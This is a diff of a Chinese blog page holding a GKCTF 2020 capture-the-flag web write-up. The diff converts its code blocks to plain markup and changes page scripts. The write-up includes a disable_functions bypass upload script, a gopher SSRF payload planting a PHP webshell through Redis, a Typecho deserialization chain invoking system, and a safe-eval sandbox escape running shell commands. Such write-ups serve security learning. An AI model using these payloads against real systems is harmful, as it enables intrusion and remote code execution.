@@ -466,7 +466,21 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 <h2 id="check-in"><a href="#check-in" class="headerlink" title="check_in"></a>check_in</h2><p>题目给出了源码。基本机理就是从<code>$_REQUEST</code>里获取Ginkgo变量然后eval执行。<br>phpinfo()的话会发现存在<code>disable_function</code>,列目录会发现根目录有readflag.<br>但是不要紧。我们有bypass脚本用,下面就是之前做buu上一道<code>l33t-hoster</code>的脚本拿来改的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://5e0893e9-0a1c-4836-8865-2771c87a52e4.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">"Ginkgo"</span>:base64.b64encode(payload.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)&#125;</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/exploit.php');echo 'ok';var_dump(scandir('/tmp'));"</span></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'exploit.php'</span>,open(<span class="string">"exploit.php"</span>,<span class="string">"rb"</span>),<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url,data=command(payload),files=files)</span><br><span class="line">r=requests.post(url=url,data=command(<span class="string">'include("/tmp/exploit.php");'</span>))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+import base64
+
+
+url=&#39;http://5e0893e9-0a1c-4836-8865-2771c87a52e4.node3.buuoj.cn/&#39;
+
+
+def command(payload):
+    return {&quot;Ginkgo&quot;:base64.b64encode(payload.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)}
+
+payload=&quot;move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],&#39;/tmp/exploit.php&#39;);echo &#39;ok&#39;;var_dump(scandir(&#39;/tmp&#39;));&quot;
+files = [(&#39;file&#39;,(&#39;exploit.php&#39;,open(&quot;exploit.php&quot;,&quot;rb&quot;),&#39;application/octet-stream&#39;))]
+r = requests.post(url=url,data=command(payload),files=files)
+r=requests.post(url=url,data=command(&#39;include(&quot;/tmp/exploit.php&quot;);&#39;))
+print(r.text)</code></pre>
 <p>脚本要传到<code>/tmp</code>下,否则其他目录应该是不可写的。然后包含即可。</p>
 <h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>这题说实话挺简单的。就是手慢了几步。<br>首先后台getshell不讲了,主要是按照网上能搜到的<br>ShopXO全版本getshell流程走：先默认密码登录后台,下载主题并加上webshellbyc.php,再重新上传zip文件,访问<code>/public/static/index/default/byc.php</code>即可.</p>
 <p>拿到www-data的shell后发现需要提权。然后根目录<code>flag.hint</code>里给了个日期.不过我并没有怎么在意这个日期,而是按照自己htb渗透的习惯来.</p>
@@ -475,25 +489,125 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>这题二血。算是比较有意思的题目。</p>
 <p>首先会发现首页功能似乎是个ssrf。然后还给出了<code>?secret</code>参数看ip地址.<br>不过其实这里并不需要给ip的,因为可以直接读<code>/etc/hosts</code></p>
 <p>当然,想要常规的file协议读肯定是不行的.但是它过滤的不严，可以用类似xxe里利用file协议列目录的方式来读<br><code>file:/var/www/html/index.php</code><br>得到源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">        <span class="comment">//echo $url."\n";</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span>, $url,$match))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//var_dump($match);</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'别这样'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'secret'</span>]))&#123;</span><br><span class="line">    system(<span class="string">'ifconfig'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+function curl($url){  
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    echo curl_exec($ch);
+    curl_close($ch);
+}
+
+if(isset($_GET[&#39;submit&#39;])){
+        $url = $_GET[&#39;url&#39;];
+        //echo $url.&quot;\n&quot;;
+        if(preg_match(&#39;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#39;, $url,$match))
+        {
+            //var_dump($match);
+            die(&#39;别这样&#39;);
+        }
+        curl($url);
+}
+if(isset($_GET[&#39;secret&#39;])){
+    system(&#39;ifconfig&#39;);
+}
+?&gt;</code></pre>
 <p>不过flag并不在本机173.92.140.13。实际上这种方式想读根目录也并不可行。但基于这里是个curl的ssrf。那么就大有可为。<br>不过这一步浪费了不少时间,后面才反应过来可以顺着探内网。<br>尝试直接顺着ip探内网存活主机,发现173.92.140.13,提示其他端口,猜测是redis或者mysql之类的。<br>于是探6379端口得到redis的报错命令。那么基本可以确认是gopher协议利用ssrf打redis未授权getshell了。<br>可以看这篇文章<a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">Redis和SSRF</a></p>
 <p>命令的构建主要是编码问题。把命令进行正确编码就能打了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.92.140.13:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
-<p>这样就在140.13那写入webshell。然后直接<code>173.92.140.13/shell.php?cmd=cat%20/flag</code>即可</p>
+<pre><code>gopher://173.92.140.13:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre><p>这样就在140.13那写入webshell。然后直接<code>173.92.140.13/shell.php?cmd=cat%20/flag</code>即可</p>
 <h2 id="EZ三剑客-EzTypecho"><a href="#EZ三剑客-EzTypecho" class="headerlink" title="EZ三剑客-EzTypecho"></a>EZ三剑客-EzTypecho</h2><p>这题真的可惜。比赛时因为其他题目没来得及看。结果发现基本就是原本的链子加上一个bypass就行了。</p>
 <p>先来过下源码。关于typeecho的洞出在install.php算是比较熟知的了。所以网上基本两个版本的POP链。如果有install.php就可以按第一个的思路走。<br>首先这里的源码表明必须get<code>finish</code>参数以及带上Referer才不会退出。<br><img src="/2020/05/24/GKCTF2020writeup/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>接下来是反序列化点<br><img src="/2020/05/24/GKCTF2020writeup/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这里实际上只加上了一个session的判断。如果以前有现成的pocbypass了这个判断就能直接打了。这里自己先按照链子跟一下。</p>
 <p>上面我们的序列化数据被送进实例化了一个Typeecho_Db类里。跟进下<br>发现构造方法调用了<code>call_user_func()</code><br><img src="/2020/05/24/GKCTF2020writeup/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>然后call_user_func的参数<code>$adapterName</code>有一个字符串拼接。那说明可以触发<code>__toString</code>.我们全局找下<code>__toString</code><br>找到<code>var\Typecho\Feed.php</code><br>其魔术方法中有这样一段<br><img src="/2020/05/24/GKCTF2020writeup/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这里item是遍历<code>items</code>得来的。而items可控。并且由于箭头所指位置调用了<code>screenname</code>属性。因此可能可以触发<code>__get</code>方法<br>全局搜找到<code>var\Typecho\Request.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function __get($key)
+{
+    return $this-&gt;get($key);
+}</code></pre>
 <p>而get是<br><img src="/2020/05/24/GKCTF2020writeup/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>我们上面要触发<code>__get</code>,是因为调用了<code>screneName</code>属性。那么触发get的话就是对应了<code>$key</code>。可以看到最后被送进<code>_applyFilter</code>的参数值来自<code>params[$key]</code>仍然是可控的<br>最后就是跟进函数了。发现调用<code>call_user_func</code>可以命令执行。参数可控。所以链子到此结束。<br><img src="/2020/05/24/GKCTF2020writeup/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>poc</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'cat /flag'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'system'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items=<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">"author"</span>=&gt;<span class="keyword">new</span> Typecho_Request()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$config=<span class="keyword">array</span>(<span class="string">"adapter"</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),<span class="string">"prefix"</span>=&gt;<span class="string">'byc'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($config));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+class Typecho_Request
+{
+    private $_params = array(&#39;screenName&#39;=&gt;&#39;cat /flag&#39;);
+    private $_filter = array(&#39;system&#39;);
+}
+class Typecho_Feed
+{
+    private $_type = &#39;RSS 2.0&#39;;
+    private $_items;
+    public function __construct()
+    {
+        $this-&gt;_items=array(array(&quot;author&quot;=&gt;new Typecho_Request()));
+
+    }
+}
+$config=array(&quot;adapter&quot;=&gt;new Typecho_Feed(),&quot;prefix&quot;=&gt;&#39;byc&#39;);
+echo base64_encode(serialize($config));
+?&gt;</code></pre>
 <p>最后再回到开始提到的问题。想要触发反序列化必须要有个session.不过其实也有好几道题设及到了这个知识点。我们利用php的特性。带上<code>php_session_upload_progress</code>上传文件。并且cookie带上PHPSESSID。就会发现不会触发它提示<code>no, you can&#39;t unserialize it without session QAQ</code>了<br>结果<br><img src="/2020/05/24/GKCTF2020writeup/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>当然这题不按这个思路来也是可以的。因为get传参<code>start</code>处也有一个反序列化。直接打也没问题。总之这题花的时间是最短的,比赛时没做真的可惜。</p>
 <h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><p>这题跟之前做npuctf时的一道node差不多。不过这里直接用的<code>safe-eval</code>库。显然是有poc可逃逸的。但是在这之前肯定有waf要绕。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">app.use((req, res, next) =&gt; {
+  if (req.path === &#39;/eval&#39;) {
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) {
+      delay = Math.max(delay, parseInt(req.query.delay));
+    }
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; {
+      clearTimeout(t);
+      console.log(&#39;timeout&#39;);
+      try {
+        res.send(&#39;Timeout!&#39;);
+      } catch (e) {
+
+      }
+    }, 1000);
+  } else {
+    next();
+  }
+});</code></pre>
 <p>这里settimout会发现导致我们的payload都无法执行。因此需要绕过,让delay小于1000才能进到safeeval的路由里。<br><a href="https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-values" target="_blank" rel="noopener">https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-values</a><br>这里存在一个issue。就是我们传入的delay如果大小超过32位，会被<code>settimeout</code>设为1.这样就满足条件了。<br>后面搜到的safe-eval的poc直接打</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> f = Buffer.prototype.write;</span><br><span class="line">  <span class="keyword">const</span> ft = &#123;</span><br><span class="line">    length: <span class="number">10</span>,</span><br><span class="line">    utf8Write()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      x = r(i);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(x)!==<span class="string">'number'</span>)</span><br><span class="line">      <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(x!==i)</span><br><span class="line">      <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      f.call(ft);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      i=r(i).constructor.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i.mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"id"</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">const theFunction = function () {
+  const f = Buffer.prototype.write;
+  const ft = {
+    length: 10,
+    utf8Write(){
+
+    }
+  };
+  function r(i){
+    var x = 0;
+    try{
+      x = r(i);
+    }catch(e){}
+    if(typeof(x)!==&#39;number&#39;)
+      return x;
+    if(x!==i)
+      return x+1;
+    try{
+      f.call(ft);
+    }catch(e){
+      return e;
+    }
+    return null;
+  }
+  var i=1;
+  while(1){
+    try{
+      i=r(i).constructor.constructor(&quot;return process&quot;)();
+      break;
+    }catch(x){
+      i++;
+    }
+  }
+  return i.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()
+};
+const untrusted = `(${theFunction})()`;
+
+console.log(saferEval(untrusted));</code></pre>
 <p>改成IIFE形式直接打。</p>
 <p><code>(function(){xxxxx})()</code><br><img src="/2020/05/24/GKCTF2020writeup/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="CVE版签到"><a href="#CVE版签到" class="headerlink" title="CVE版签到"></a>CVE版签到</h2><p>这题我是真的没理解出题人的意思。后面提醒了CVE后还是没理解出题人的意思……结果大部分时间都花在这题上了。</p>
@@ -711,7 +825,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -723,9 +837,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -858,6 +972,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1071,7 +1187,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1127,6 +1243,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
